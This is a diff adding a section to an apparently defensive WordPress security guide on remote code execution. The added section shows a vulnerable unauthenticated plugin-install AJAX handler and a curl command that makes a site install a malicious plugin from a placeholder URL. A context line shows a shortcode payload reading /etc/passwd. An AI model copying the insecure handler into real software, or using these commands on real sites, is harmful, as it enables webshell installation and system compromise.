@@ -81,6 +81,31 @@ To exploit this, the Contributor+ role user simply needs to create a drafted pos
 [imagerender src="https://patchstack.com" sanitize="system" text="cat /etc/passwd"]
 ```
 
+## Arbitrary Plugin Installation
+
+If there is no proper permission check while installing the plugins, it can lead to Remote Code Execution. An attacker can just create a malicious ZIP and provide it as the source to install the webshell in the WP site.
+
+```php
+add_action('wp_ajax_nopriv_install_remote_plugin', function() {
+    if (isset($_GET['install_plugin_url'])) {
+        $plugin_url = esc_url_raw($_GET['install_plugin_url']);
+
+        include_once ABSPATH . 'wp-admin/includes/class-wp-upgrader.php';
+        include_once ABSPATH . 'wp-admin/includes/file.php';
+        include_once ABSPATH . 'wp-admin/includes/misc.php';
+
+        $upgrader = new Plugin_Upgrader();
+        $upgrader->install($plugin_url);
+    }
+});
+```
+
+To exploit this, any unauthenticated user just needs to perform a GET request to the `/wp-admin/admin-ajax.php` endpoint specifying the remote URL of the malicious plugin.
+
+```bash
+curl <WORDPRESS_BASE_URL>/wp-admin/admin-ajax.php?action=install_remote_plugin&install_plugin_url=http://<malicious-url>
+```
+
 Below are some of the findings related to RCE:
 
 - [Authenticated RCE in JetElements For Elementor Plugin](https://patchstack.com/articles/authenticated-rce-in-jetelements-for-elementor-plugin/)
